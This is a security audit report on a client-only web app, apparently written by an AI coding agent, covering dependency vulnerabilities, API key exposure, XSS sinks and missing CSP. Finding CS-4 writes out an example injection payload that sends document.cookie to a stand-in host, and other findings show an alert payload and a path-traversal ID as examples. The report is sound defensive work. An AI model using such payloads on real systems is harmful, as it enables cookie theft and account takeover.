# Phase 6 — Security Audit

**Project**: InfoNugget v6.0
**Date**: 2026-02-24
**Auditor**: Claude Code (Opus 4.6)
**Tools**: npm audit, manual code analysis (grep, read)
**Mode**: READ-ONLY (no source files modified)

---

## Dependency Vulnerabilities

### Summary

| Severity | Count |
|----------|-------|
| Critical | **0** |
| High | **12** |
| Moderate | **0** |
| Low | **0** |

**Total dependencies scanned**: 722 (94 prod, 615 dev, 97 optional)

### High Severity — `minimatch` ReDoS (CVE: GHSA-3ppc-4f35-3m26)

All 12 high-severity findings trace to a single root cause: **`minimatch < 10.2.1`** is vulnerable to Regular Expression Denial of Service (ReDoS) via repeated wildcards with non-matching literal patterns.

| # | Vulnerable Package | Direct/Transitive | Depends On | Fix Available |
|---|---|---|---|---|
| 1 | `minimatch` (root) | Transitive | — | Yes: upgrade to `>=10.2.1` |
| 2 | `@eslint/config-array` ≤0.22.0 | Transitive | minimatch | Yes: `eslint@10.0.2` (breaking) |
| 3 | `@eslint/eslintrc` ≥0.1.1 | Transitive | minimatch | Yes: `eslint@10.0.2` (breaking) |
| 4 | `eslint` 4.1.0–10.0.0-rc.2 | **Dev dependency** | @eslint/config-array, @eslint/eslintrc, minimatch | Yes: `eslint@10.0.2` (breaking) |
| 5 | `eslint-plugin-import` ≥1.15.0 | Dev dependency | minimatch | Yes: `eslint-plugin-import@1.14.0` (breaking) |
| 6 | `eslint-plugin-jsx-a11y` ≥6.5.0 | Dev dependency | minimatch | Yes (via plugin update) |
| 7 | `eslint-plugin-react` ≥7.23.0 | Dev dependency | minimatch | Yes (via plugin update) |
| 8 | `eslint-plugin-promise` ≥5.0.0 | Dev dependency | eslint | Yes (via eslint update) |
| 9 | `eslint-plugin-sonarjs` 0.6.0–3.0.7 | Dev dependency | eslint | Yes (via eslint update) |
| 10 | `glob` 3.0.0–10.5.0 | Transitive | minimatch | Yes: update glob |
| 11 | `rimraf` 2.3.0–5.0.10 | Transitive | glob | Yes: update rimraf |
| 12 | `gaxios` ≥7.1.3 | Transitive | rimraf | Yes: update gaxios |

**Risk Assessment**: LOW in practice.
- All 12 vulnerabilities are in **dev dependencies** (ESLint ecosystem, installed during this audit)
- None affect the production bundle — they are not shipped to users
- The ReDoS attack requires crafted glob patterns, unlikely in normal ESLint usage
- `gaxios` (item 12) is a transitive dependency of `@google/genai`, but the vulnerable `minimatch` is only in its dev/build chain

**Fix path**: Upgrade `eslint` from `^9.0.0` to `^10.0.2` once all plugins publish ESLint 10-compatible versions. No production code changes needed.

---

## Secrets & Credentials

### Summary

| Check | Result |
|-------|--------|
| Exposed secrets in source code? | **NO** |
| `.env.local` properly gitignored? | **YES** (via `*.local` pattern) |
| All secrets via environment variables? | **YES** |
| `.env` files committed to git? | **NO** |
| `.env.example` with real values? | **N/A** (no .env.example exists) |

### Finding S-1: Live API Keys in `.env.local` (CRITICAL context)

| Attribute | Value |
|-----------|-------|
| **File** | `.env.local` (lines 1–3) |
| **What found** | 3 real API keys: `GEMINI_API_KEY=AIza...`, `GEMINI_API_KEY_FALLBACK=AIza...`, `ANTHROPIC_API_KEY=sk-a...` |
| **Severity** | Informational (expected for client-side SPA) |
| **Git tracked?** | NO — `.gitignore` contains `*.local`, confirmed excluded |
| **Assessment** | Keys are correctly stored in `.env.local` and never committed. However, they are real credentials on the filesystem. If this directory is ever shared (zip, backup, cloud sync), keys are exposed. |

### Finding S-2: API Keys Baked into Production Bundle

| Attribute | Value |
|-----------|-------|
| **File** | `dist/assets/index-BZSGYnTO.js` (minified bundle) |
| **What found** | All 3 API keys are string-inlined via Vite's `define` mechanism |
| **Severity** | HIGH (architecture-inherent) |
| **Git tracked?** | NO — `dist/` is gitignored |
| **Assessment** | This is the documented and accepted trade-off for a client-only SPA with no backend. Anyone who can access the built bundle can extract all API keys. |

### Finding S-3: `anthropic-dangerous-direct-browser-access` Header

| Attribute | Value |
|-----------|-------|
| **File** | `utils/ai.ts` (lines 412, 477, 602) |
| **What found** | Header `'anthropic-dangerous-direct-browser-access': 'true'` on all 3 Anthropic API call sites |
| **Severity** | MEDIUM (architecture-inherent) |
| **Assessment** | Required by Anthropic for direct browser-to-API calls. Anthropic named it "dangerous" to signal the inherent risk: the API key is visible in browser DevTools. This is a fundamental design limitation of the no-backend architecture. |

### Finding S-4: Dev Server Bound to `0.0.0.0`

| Attribute | Value |
|-----------|-------|
| **File** | `vite.config.ts` (line 45) |
| **What found** | `host: '0.0.0.0'` — dev server accessible from all network interfaces |
| **Severity** | HIGH |
| **Assessment** | Any device on the same network can access the dev server and extract API keys from the JavaScript bundle. On public WiFi or shared networks, this is a direct key exposure vector. |

### How API Keys Flow

```
.env.local  →  vite.config.ts (readDotEnvLocal)  →  define: { process.env.* }
                                                           ↓
                                              Build-time string replacement
                                                           ↓
                                               utils/ai.ts runtime access
                                                           ↓
                                    Sent in HTTP headers (x-api-key, SDK constructor)
```

Keys are **never** logged, stored in localStorage, or exposed in the DOM. Console debug statements log token counts and file IDs only — never key values.

---

## Code Security Issues

### XSS Vulnerabilities

#### CS-1: `dangerouslySetInnerHTML` with Unsanitized `marked.parse()` Output

- **Location**: `components/ChatPanel.tsx:260`
- **Issue**: AI assistant responses are rendered via `marked.parse()` → `dangerouslySetInnerHTML` with no HTML sanitization
- **Severity**: MEDIUM
- **Exploitability**: If the Claude API returns markdown containing embedded HTML (`<img onerror="...">`, `<a href="javascript:...">`), it would execute. While unlikely from Claude, any future change allowing user-sourced content into messages creates a direct XSS path.
- **Recommended fix**: Pipe `marked.parse()` output through DOMPurify before rendering.

#### CS-2: `dangerouslySetInnerHTML` for Chat System Notices

- **Location**: `components/ChatPanel.tsx:439`
- **Issue**: System notice messages (document change notifications) rendered via `marked.parse()` → `dangerouslySetInnerHTML` without sanitization
- **Severity**: LOW
- **Exploitability**: If a user uploads a file with a crafted name containing HTML tags (e.g., `<img src=x onerror=alert(1)>.pdf`), the name flows into the system notice and renders unsanitized.
- **Recommended fix**: HTML-escape document names before inserting into system messages, and/or pipe through DOMPurify.

#### CS-3: `dangerouslySetInnerHTML` for AI Prompt Display

- **Location**: `components/AssetsPanel.tsx:688`
- **Issue**: AI-generated prompt content rendered via `marked.parse()` → `dangerouslySetInnerHTML` without sanitization
- **Severity**: MEDIUM
- **Exploitability**: Content originates from AI-generated prompts stored in IndexedDB. An attacker with IndexedDB access (via separate XSS or browser extension) could inject malicious HTML that executes when the "Prompt" tab is viewed.
- **Recommended fix**: Pipe through DOMPurify.

#### CS-4: `innerHTML` from `marked.parse()` in Document Editor (×4 instances)

- **Location**: `hooks/useDocumentEditing.ts:107, 124, 160, 251`
- **Issue**: User-uploaded markdown documents parsed with `marked` and assigned directly to `editorRef.current.innerHTML` with no sanitization
- **Severity**: MEDIUM
- **Exploitability**: User-uploaded markdown commonly supports inline HTML. A document containing `<img onerror="fetch('https://evil.com/?c='+document.cookie)">` would execute when loaded. This is the **most realistic attack vector** — a user could unknowingly open a malicious markdown file.
- **Recommended fix**: Sanitize `marked.parse()` output with DOMPurify before assigning to innerHTML.

#### CS-5: `innerHTML` in Paste Handler

- **Location**: `hooks/useDocumentEditing.ts:296`
- **Issue**: Paste handler assembles HTML from `node.textContent` + literal `<br>` tags
- **Severity**: LOW
- **Exploitability**: Limited — only extracts text content (not HTML) from clipboard data. Safe by design.
- **Recommended fix**: Add a code comment documenting the safety invariant.

#### CS-6: `innerHTML` in Heading Level Change

- **Location**: `hooks/useDocumentEditing.ts:425`
- **Issue**: `newEl.innerHTML = el.innerHTML` copies content between heading elements in the live editor
- **Severity**: LOW
- **Exploitability**: DOM-to-DOM copy within the same editor. Does not introduce new vectors but propagates any existing malicious content from CS-4.
- **Recommended fix**: Address CS-4 at the entry point (sanitize on document load).

#### CS-7: `innerHTML` in HTML-to-Markdown Converter

- **Location**: `utils/markdown.ts:26`
- **Issue**: `tempDiv.innerHTML = html` assigns editor content to a detached element for markdown conversion
- **Severity**: LOW
- **Exploitability**: Detached elements don't execute `<script>` tags, but `<img onerror>` can still fire when assigned to innerHTML even on detached nodes.
- **Recommended fix**: Use `new DOMParser().parseFromString(html, 'text/html')` instead.

#### CS-8: No `eval()`, `document.write()`, `new Function()`, or URL Parameter Injection Found

✅ Clean — no instances of these high-risk patterns found in any source file.

### Injection Risks

#### CS-9: Template Literal in File API Delete URL

- **Location**: `utils/ai.ts:596`
- **Issue**: `` `/api/anthropic-files/${fileId}` `` uses template literal interpolation. `fileId` comes from Anthropic API response data stored in IndexedDB.
- **Severity**: LOW
- **Exploitability**: A corrupted IndexedDB record with a malicious `fileId` like `../../v1/messages` could redirect the DELETE request. The proxy rewrite rule limits blast radius, and the Anthropic API would reject malformed IDs.
- **Recommended fix**: Validate `fileId` format with regex (`/^file_[a-zA-Z0-9]+$/`) before interpolation.

#### CS-10: User Input in AI Prompt (Prompt Injection)

- **Location**: `utils/ai.ts:548`
- **Issue**: User-provided style `name` and `description` interpolated directly into AI prompt string without delimiters
- **Severity**: LOW
- **Exploitability**: This is a prompt injection vector, not code injection. Since the user controls their own data in this client-side app, the risk is self-exploitation only.
- **Recommended fix**: Wrap user inputs in delimiters: `<user_input>...</user_input>`.

### Data Exposure

#### CS-11: Raw API Error Bodies Shown to Users

- **Location**: `utils/ai.ts:420` → propagates to `App.tsx:1711`, `hooks/useInsightsLab.ts:218`
- **Issue**: `throw new Error('Claude API error ${res.status}: ${errorBody}')` includes the full error response body from the Anthropic API. This propagates to toast notifications and chat messages.
- **Severity**: MEDIUM
- **Exploitability**: Raw API error bodies may contain server-side diagnostics, request IDs, or infrastructure details. These are surfaced directly in the UI.
- **Recommended fix**: Parse the error body and extract only a user-friendly message. Map HTTP status codes to human-readable error descriptions.

#### CS-12: Verbose Error Logging to Console

- **Location**: `hooks/useCardGeneration.ts:371-376`, ~40+ locations across codebase
- **Issue**: `console.error("Generation error details:", JSON.stringify({...}))` outputs detailed error info including `err.message`, `err.status`, `err.code`, `err.details`, `err.errorInfo`, plus card settings
- **Severity**: LOW
- **Exploitability**: Console is only visible to local user with DevTools. If a browser extension captures console output, error details from the Anthropic API could be leaked.
- **Recommended fix**: Reduce logging verbosity. Log only `err.message`, not full error objects with API response data.

#### CS-13: IndexedDB Stores All User Data Unencrypted

- **Location**: `utils/storage/IndexedDBBackend.ts`, `utils/storage/serialize.ts`
- **Issue**: All user data stored unencrypted in IndexedDB: document content, chat messages, card outputs, image data URLs, Anthropic Files API file IDs, project metadata
- **Severity**: MEDIUM
- **Exploitability**: Any JavaScript running on the same origin can read IndexedDB. If any XSS vulnerability (CS-1 through CS-7) is exploited, the attacker could exfiltrate all user data. Stored `fileId` values + API key = access to Anthropic Files API resources.
- **Recommended fix**: Primary mitigation is fixing XSS vulnerabilities to prevent IndexedDB access. Consider encrypting sensitive fields (fileIds) at rest.

### CORS and CSP

#### CS-14: No Content-Security-Policy (HIGH)

- **Location**: `index.html` (entire file)
- **Issue**: No CSP meta tag or header configured. Page loads scripts from 3 external CDNs without Subresource Integrity (SRI) hashes:
  - `cdn.tailwindcss.com` (Tailwind JIT compiler)
  - `esm.sh` (React, React DOM, @google/genai, marked — importmap)
  - `fonts.googleapis.com` / `fonts.gstatic.com`
- **Severity**: HIGH
- **Exploitability**: Without CSP, any XSS can load arbitrary external scripts. Without SRI, a compromised CDN delivers malicious code with full page context access (including API keys in the JS bundle).
- **Recommended fix**: Add CSP meta tag restricting `script-src`, `style-src`, `connect-src`, `font-src`. Add SRI integrity attributes to external script tags. Best: migrate Tailwind to build-time to eliminate CDN dependency entirely.

#### CS-15: Dev Server Proxy (Low Risk)

- **Location**: `vite.config.ts:46-53`
- **Issue**: Vite proxy `/api/anthropic-files` → `https://api.anthropic.com/v1/files` with `changeOrigin: true`
- **Severity**: LOW (dev-only)
- **Exploitability**: Only active during development. Properly scoped to single path prefix. Combined with CS-4 (host: 0.0.0.0), any device on the LAN could use this proxy.
- **Recommended fix**: Document that this proxy must not be exposed to untrusted networks.

### Dependency Version Pinning

#### CS-16: Mixed Pinning Strategies

- **Location**: `package.json`
- **Issue**: Mixed version pinning across dependencies

| Dependency | Version | Strategy | Risk |
|------------|---------|----------|------|
| `@google/genai` | `^1.41.0` | Caret (minor+patch) | Medium — rapidly evolving SDK |
| `marked` | `15.0.7` | **Exact** ✅ | Low |
| `pdf-lib` | `^1.17.1` | Caret | Low — stable library |
| `pdfjs-dist` | `^5.4.624` | Caret | Low |
| `react` | `^19.2.4` | Caret | Low |
| `react-dom` | `^19.2.4` | Caret | Low |
| `typescript` | `~5.8.2` | Tilde (patch only) ✅ | Low |
| `vite` | `^6.2.0` | Caret | Low |

- **Severity**: LOW
- **Recommended fix**: Pin `@google/genai` to exact version. The `package-lock.json` mitigates most risk for consistent installs.

#### CS-17: CDN Importmap Uses Caret Ranges

- **Location**: `index.html:367-378`
- **Issue**: The importmap references CDN packages with `^` range specifiers (e.g., `"react": "https://esm.sh/react@^19.2.4"`). The CDN may serve different versions over time with no lockfile protection.
- **Severity**: MEDIUM
- **Exploitability**: Supply chain attack — if `esm.sh` serves a compromised version of any package, it runs with full page access. No integrity hash, no version pinning.
- **Recommended fix**: Pin exact versions in importmap (remove `^` prefix). Better: remove importmap entirely since Vite bundles these at build time (importmap appears to be a dev/fallback artifact).

---

## Security Posture Summary

### Overall Assessment: MODERATE RISK (for a client-only SPA)

The application's security posture reflects the inherent trade-offs of a **client-side SPA with no backend**. The most significant risks stem from this architectural decision, not from coding mistakes.

**What's done well:**
- ✅ API keys stored in `.env.local`, properly gitignored, never committed
- ✅ Keys accessed via environment variable injection (not hardcoded in source)
- ✅ No `eval()`, `document.write()`, or `new Function()` usage
- ✅ No URL parameter injection vectors
- ✅ No secrets logged to console (only file IDs and token counts)
- ✅ localStorage used only for non-sensitive preferences (dark mode)
- ✅ AbortController used for request cancellation in 3/4 major hooks
- ✅ No private keys, database credentials, or AWS credentials present

**What needs attention:**

### Top 3 Priorities

#### Priority 1: Add HTML Sanitization (DOMPurify) — 7 Locations

| # | File | Line(s) | Pattern | Risk |
|---|------|---------|---------|------|
| CS-1 | `ChatPanel.tsx` | 260 | `dangerouslySetInnerHTML` + `marked.parse()` | MEDIUM |
| CS-2 | `ChatPanel.tsx` | 439 | `dangerouslySetInnerHTML` + `marked.parse()` | LOW |
| CS-3 | `AssetsPanel.tsx` | 688 | `dangerouslySetInnerHTML` + `marked.parse()` | MEDIUM |
| CS-4 | `useDocumentEditing.ts` | 107, 124, 160, 251 | `innerHTML` + `marked.parse()` | MEDIUM |
| CS-7 | `markdown.ts` | 26 | `innerHTML` on detached element | LOW |

**Fix**: Install `dompurify`, create a `sanitizeHtml(html: string): string` utility, and pipe all `marked.parse()` output through it before rendering. **One library, one utility function, 7 call sites updated.**

#### Priority 2: Add Content-Security-Policy (CS-14)

No CSP means any successful XSS attack has unrestricted access. A CSP would limit the blast radius by preventing inline script execution, restricting `connect-src` to known API domains, and blocking unauthorized external resource loading.

**Fix**: Add a `<meta http-equiv="Content-Security-Policy" ...>` tag to `index.html` with restrictive directives. Migrate Tailwind CDN to build-time to simplify the policy.

#### Priority 3: Restrict Dev Server Binding (S-4)

Changing `host: '0.0.0.0'` to `host: 'localhost'` in `vite.config.ts` is a **one-line fix** that eliminates network-adjacent API key exposure during development.

### Risk Matrix

| Category | Count | Severity Distribution |
|----------|-------|-----------------------|
| XSS / HTML Injection | 8 findings | 0 CRIT, 0 HIGH, 4 MEDIUM, 4 LOW |
| Secrets & Credentials | 4 findings | 0 CRIT, 1 HIGH, 1 MEDIUM, 2 LOW |
| Data Exposure | 3 findings | 0 CRIT, 0 HIGH, 2 MEDIUM, 1 LOW |
| CORS / CSP | 3 findings | 0 CRIT, 1 HIGH, 0 MEDIUM, 2 LOW |
| Injection | 2 findings | 0 CRIT, 0 HIGH, 0 MEDIUM, 2 LOW |
| Supply Chain / Deps | 2 findings | 0 CRIT, 0 HIGH, 1 MEDIUM, 1 LOW |
| **Total** | **22 findings** | **0 CRIT, 2 HIGH, 8 MEDIUM, 12 LOW** |

### Dependency Vulnerabilities (npm audit)

| Severity | Count | In Production? |
|----------|-------|----------------|
| Critical | 0 | — |
| High | 12 | NO (all dev dependencies — ESLint ecosystem) |
| Moderate | 0 | — |
| Low | 0 | — |

All 12 high-severity npm audit findings are in **dev dependencies only** (ESLint's `minimatch` ReDoS vulnerability). They do not affect the production bundle and pose minimal real-world risk.

### Architecture-Inherent Risks (Cannot Fix Without Backend)

These are accepted trade-offs of the no-backend client-only SPA design:

1. **API keys visible in client bundle** — Anyone with access to the built JS can extract Anthropic and Gemini API keys
2. **`anthropic-dangerous-direct-browser-access` header** — Required for browser-to-API calls, signals inherent key exposure
3. **No server-side authentication** — Cannot implement rate limiting, user authentication, or key scoping without a backend

These risks are documented and accepted for the project's use case (single-user/small-team internal tool). For any public deployment, a backend proxy holding the API keys server-side would be required.
